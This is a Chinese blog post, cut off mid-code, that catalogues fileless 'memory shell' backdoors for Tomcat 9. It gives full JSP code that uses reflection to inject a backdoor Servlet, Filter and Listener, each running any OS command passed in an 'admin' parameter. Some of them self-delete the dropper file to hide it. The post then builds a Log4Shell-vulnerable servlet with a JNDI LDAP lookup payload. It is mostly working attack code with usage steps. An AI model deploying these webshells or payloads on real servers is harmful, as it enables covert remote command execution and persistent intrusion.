<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>JavaWeb 内存马技术归纳 - 4xpl0r3r&#039;s blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="4xpl0r3r&#039;s blog"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="4xpl0r3r&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292"><meta property="og:type" content="blog"><meta property="og:title" content="JavaWeb 内存马技术归纳"><meta property="og:url" content="https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"><meta property="og:site_name" content="4xpl0r3r&#039;s blog"><meta property="og:description" content="本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126193430429.png"><meta property="og:image" content="https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194726803.png"><meta property="og:image" content="https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194823501.png"><meta property="og:image" content="https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194842825.png"><meta property="og:image" content="https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126195048536.png"><meta property="article:published_time" content="2022-02-11T11:38:47.000Z"><meta property="article:modified_time" content="2022-02-11T11:43:37.752Z"><meta property="article:author" content="4xpl0r3r"><meta property="article:tag" content="Tomcat"><meta property="article:tag" content="JNDI"><meta property="article:tag" content="Java Web"><meta property="article:tag" content="内存马"><meta property="article:tag" content="Shell"><meta property="article:tag" content="ysoserial"><meta property="article:tag" content="Java Agent"><meta property="article:tag" content="恶意代码检测与隐藏"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126193430429.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"},"headline":"JavaWeb 内存马技术归纳","image":["https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126193430429.png","https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194726803.png","https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194823501.png","https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194842825.png","https://cn.4xpl0r3r.com/img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126195048536.png"],"datePublished":"2022-02-11T11:38:47.000Z","dateModified":"2022-02-11T11:43:37.752Z","author":{"@type":"Person","name":"4xpl0r3r"},"publisher":{"@type":"Organization","name":"4xpl0r3r's blog","logo":{"@type":"ImageObject","url":{"text":"4xpl0r3r"}}},"description":"本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292"}</script><link rel="canonical" href="https://cn.4xpl0r3r.com/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?54a4d5a34df4e0b3a14ee586abbe506b";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-RPBTCRM58X" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-RPBTCRM58X');</script><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="follow_it-verification-code" content="qUbeerQV2zzsAnkYL1eR"><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="4xpl0r3r's blog" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">4xpl0r3r</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/4xpl0r3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-02-11T11:38:47.000Z" title="2/11/2022, 7:38:47 PM">2022-02-11</time>发表</span><span class="level-item"><time dateTime="2022-02-11T11:43:37.752Z" title="2/11/2022, 7:43:37 PM">2022-02-11</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/">技术归纳</a></span><span class="level-item">32 分钟读完 (大约4776个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">JavaWeb 内存马技术归纳</h1><div class="content"><p>本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292</p>
<span id="more"></span>


<p>首先我们整理一下几种植入内存马的方式</p>
<ul>
<li>基于JSP WebShell植入内存马</li>
<li>基于JavaWeb RCE漏洞植入内存马<ul>
<li>真正的无文件落地内存马</li>
</ul>
</li>
<li>通过Java Agent植入内存马</li>
</ul>
<p>由于我们使用的是Tomcat，可以通过动态增加Servlet、Filter、Listener来植入内存马，如果技术栈还存在Spring和Shiro等，还可以使用增加Controller等方法</p>
<h2 id="基于JSP-WebShell植入内存马"><a href="#基于JSP-WebShell植入内存马" class="headerlink" title="基于JSP WebShell植入内存马"></a>基于JSP WebShell植入内存马</h2><blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://github.com/bitterzzZZ/MemoryShellLearn/tree/main/jsp%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC">MemoryShellLearn/jsp注入内存马 at main · bitterzzZZ/MemoryShellLearn (github.com)</a></p>
</blockquote>
<h3 id="配置开发环境"><a href="#配置开发环境" class="headerlink" title="配置开发环境"></a>配置开发环境</h3><p>IDEA使用Web Profile配置创建Java EE项目，使用Tomcat 9.0.58进行学习，不同版本的Tomcat的内部不同，本文统一使用Tomcat 9</p>
<p>为了在JSP中开发内存马，我们需要使用Tomcat的API，虽然在放在Tomcat中就可以直接使用Tomcat的API，但是IDEA无法进行代码提示，因此我们要在项目设置中把Apache Tomcat中的lib文件夹加入项目的Libraries中去，除此之外还要引入tomcat的<code>/bin/tomcat-juli.jar</code></p>
<p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126193430429.png" alt="image-20220126193430429"></p>
<p>完成Libraries的配置后我们的代码就不会因为缺少依赖而出现报错了</p>
<h3 id="增加Servlet"><a href="#增加Servlet" class="headerlink" title="增加Servlet"></a>增加Servlet</h3><p>Servlet我们都知道，是Tomcat的最基本的服务程序，我们可以直接在内存中增加Servlet来实现无文件的内存马</p>
<p>增加Servlet的方式分为3个步骤</p>
<ol>
<li>利用反射通过<code>ApplicationContextFacade</code>获取到<code>StandardContext</code></li>
<li>将<code>Servlet</code>程序封装到<code>Wrapper</code></li>
<li>将封装好的<code>Wrapper</code>增加到<code>StandardContext</code>中并添加地址映射</li>
</ol>
<p>代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.Field&quot;</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span>  IOException </span>&#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">            HttpServletResponse response = (HttpServletResponse) res;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                response.sendError(HttpServletResponse.SC_NOT_FOUND);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext(); <span class="comment">// 获取Context</span></span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    <span class="comment">// 将Servlet添加到Context中去</span></span><br><span class="line">    BackdoorServlet backdoorServlet = <span class="keyword">new</span> BackdoorServlet();</span><br><span class="line">    org.apache.catalina.Wrapper backdoorWrapper = standardContext.createWrapper();</span><br><span class="line">    backdoorWrapper.setName(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    backdoorWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    backdoorWrapper.setServlet(backdoorServlet);</span><br><span class="line">    backdoorWrapper.setServletClass(backdoorServlet.getClass().getName());</span><br><span class="line">		<span class="comment">// jiang</span></span><br><span class="line">    standardContext.addChild(backdoorWrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/hello&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="comment">// 自毁</span></span><br><span class="line"><span class="comment">//    (new File(application.getRealPath(request.getServletPath()))).delete();</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addServlet.jsp</code>写入内存马，然后再访问<code>/hello?admin=&lt;指令&gt;</code>就可以执行命令了</p>
<h3 id="增加Filter"><a href="#增加Filter" class="headerlink" title="增加Filter"></a>增加Filter</h3><p>由于Filter在Servlet之前运行，因此可以不受URL的限制，甚至可以伪装成在对一个正常的Servlet进行访问</p>
<p>增加Filter的方式分为4个步骤</p>
<ol>
<li>通过反射从<code>ApplicationContextFacade</code>中获取到当前的<code>StandardContext</code>，从<code>StandardContext</code>获取到<code>filterConfigs</code></li>
<li>封装<code>Filter</code>为<code>FilterDef</code>，并添加到<code>StandContext</code>中</li>
<li>生成新的<code>ApplicationFilterConfig</code>并添加到<code>filterConfigs</code>中</li>
<li>创建<code>FilterMap</code>并加入<code>StandardContext</code>中，为<code>Filter</code>确定适用的URL</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.lang.reflect.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorFilter</span> <span class="keyword">extends</span> <span class="title">HttpFilter</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name = <span class="string">&quot;BackdoorFilter&quot;</span>;</span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">    field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>)&#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">        BackdoorFilter filter = <span class="keyword">new</span> BackdoorFilter();</span><br><span class="line">        <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">        FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">        <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">        FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="comment">// 自毁</span></span><br><span class="line">        (<span class="keyword">new</span> File(application.getRealPath(request.getServletPath()))).delete();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addFilter.jsp</code>写入内存马，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p>
<h3 id="增加Listener"><a href="#增加Listener" class="headerlink" title="增加Listener"></a>增加Listener</h3><p>Tomcat的Listener可以用于在某个事件发生时执行操作，我们选择实现<code>ServletRequestListener</code>来监听每一个HTTP请求</p>
<p>增加Listener的方式分为2个步骤</p>
<ol>
<li>利用反射通过<code>ApplicationContextFacade</code>获取到<code>StandardContext</code></li>
<li>将<code>Listener</code>添加到<code>StandardContext</code>中</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorListener</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    standardContext.addApplicationEventListener(<span class="keyword">new</span> BackdoorListener());</span><br><span class="line">    <span class="comment">// 自毁</span></span><br><span class="line">    (<span class="keyword">new</span> File(application.getRealPath(request.getServletPath()))).delete();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addListener.jsp</code>写入内存马，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p>
<p>介绍完Tomcat JSP内存马，接下来我们进入真正无文件落地的基于JNDI和反序列化植入内存马</p>
<h2 id="基于JNDI的内存马植入-以CVE-2021-44228-Log4Shell为例"><a href="#基于JNDI的内存马植入-以CVE-2021-44228-Log4Shell为例" class="headerlink" title="基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例"></a>基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例</h2><blockquote>
<p>关于CVE-2021-44228的分析，可以参见我之前的<a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/">讲解文章</a>，由于我使用remote codebase方法，本节只能使用jdk 8u181及以下的版本</p>
</blockquote>
<h3 id="准备Tomcat脆弱环境"><a href="#准备Tomcat脆弱环境" class="headerlink" title="准备Tomcat脆弱环境"></a>准备Tomcat脆弱环境</h3><p>首先在Tomcat项目的<code>pom.xml</code>中加入log4j-core 2.14.1的依赖，然后我们再写一个触发log4j漏洞的Servlet</p>
<blockquote>
<p>直接在自动创建的HelloServlet上修改即可</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.JavaWebDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Logger logger = LogManager.getLogger();</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        response.setContentType(<span 